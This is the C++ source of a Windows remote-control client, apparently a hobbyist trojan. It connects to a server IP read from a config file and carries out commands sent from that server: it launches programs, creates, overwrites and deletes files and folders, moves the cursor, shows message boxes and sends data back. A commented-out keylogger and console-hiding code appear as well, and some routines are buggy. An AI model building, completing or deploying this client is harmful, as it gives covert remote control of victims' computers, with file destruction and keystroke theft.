#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <winsock.h>
#include <direct.h>

using namespace std;

string a = "da";
string b = "lala";
string c = "mkdir";
string d = "mousehack";
string e = "neo";
string f = "cursoroff";
string g = "cursor";
string z = "msg";
string h = "keylog";
string s = "mspaint";
string remov = "remove";
string getcat = "getcat";
string rmdirr = "removedir";
string showf = "cat";
char filename[256];
char dirname[256];
char filedata[256];
char buffer[64];
char buffer2[64];
char msgtext[256];
char msgheader[256];
char filecat[256];


int a1 = 192, a2 = 168, a3 = 0, a4 = 101;

FILE *config;

int main()
{
    config = fopen("config.cfg", "r");
    setlocale(LC_ALL, "Russian");
    //printf("enter IP of the server ( example 127.0.0.1:5555 ): ");
	fscanf(config, "%u.%u.%u.%u", &a1, &a2, &a3, &a4);
    //HWND hWnd = GetConsoleWindow();
    //ShowWindow(hWnd, SW_HIDE);
    DWORD ret;
    char buf[1024];
    ret = GetFullPathName("client.exe", 1024, buf, NULL);
    WSAData wsaData;
    WORD DLLVersion = MAKEWORD(2, 1);
    if(WSAStartup(DLLVersion, &wsaData) != 0)
    {
        cout << "Ошибка!";
        system("pause");
        return 0;
    }

    SOCKADDR_IN addr;
    addr.sin_port = htons(1111);
    addr.sin_family = AF_INET;
    addr.sin_addr.S_un.S_un_b.s_b1 = (unsigned char)a1;
	addr.sin_addr.S_un.S_un_b.s_b2 = (unsigned char)a2;
	addr.sin_addr.S_un.S_un_b.s_b3 = (unsigned char)a3;
	addr.sin_addr.S_un.S_un_b.s_b4 = (unsigned char)a4;

    SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
    if(connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0){
        cout << "Ошибка подключения к серверу!";
        return 0;
    }
    while(true)
    {
        char cmd[256];
        recv(Connection, cmd, sizeof(cmd), NULL);
        if(cmd == a)
        {
            //cout << cmd;
            system("calc");
            //MessageBox(NULL, "DA", "DA", MB_OK);
        }
        else if(cmd == b)
        {
            recv(Connection, filename, sizeof(filename), NULL);
            ofstream outfd(filename);
        }
        else if(cmd == c)
        {
            recv(Connection, dirname, sizeof(dirname), NULL);
            mkdir(dirname);
        }
        else if(cmd == d)
        {
            while(true)
            {
                recv(Connection, buffer, sizeof(buffer), NULL);
                recv(Connection, buffer2, sizeof(buffer2), NULL);
                int x = buffer - '0';
                int y = buffer2 - '0';
                Sleep(100);
                SetCursorPos(x, y);
                //cout << "POSX = " << buffer << " POSY = " << buffer2 << "\n";
            }
        }
        else if(cmd == e)
        {
            recv(Connection, filename, sizeof(filename), NULL);
            recv(Connection, filedata, sizeof(filedata), NULL);
            ofstream outfdz(filename);
            //outfdz.open(filename, ios::out);
            outfdz << filedata << endl;
            //outfdz.close();
        }
        else if(cmd == f)
        {
            SetCursorPos(NULL, NULL);
        }
        else if(cmd == g)
        {
            SetCursorPos(555, 326);
        }
        else if(cmd == z)
        {
            recv(Connection, msgtext, sizeof(msgtext), NULL);
            recv(Connection, msgheader, sizeof(msgheader), NULL);
            MessageBox(NULL, msgtext, msgheader, MB_OK);
        }
        /*else if(cmd == h)
        {
            char q;
            while(1)
            {
                for(q = 8; q <= 190; q++)
                {
                    if (GetAsyncKeyState(q) == -32767)
                    send(Connection, q, sizeof(q), NULL);
                }
            }
        }*/
        else if(cmd == s)
        {
            system("mspaint");
        }
        else if(cmd == remov)
        {
            recv(Connection, filename, sizeof(filename), NULL);
            remove(filename);
        }
        else if(cmd == getcat)
        {
            send(Connection, buf, sizeof(buf), NULL);

        }
        else if(cmd == rmdirr)
        {
            recv(Connection, dirname, sizeof(dirname), NULL);
            rmdir(dirname);
        }
        else if(cmd == showf)
        {
            recv(Connection, filename, sizeof(filename), NULL);
            ofstream outq;
            outq.open(filename, ios::in);
            outq << filecat;
            send(Connection, filecat, sizeof(filecat), NULL);
            //outq.close();
        }
    }
}
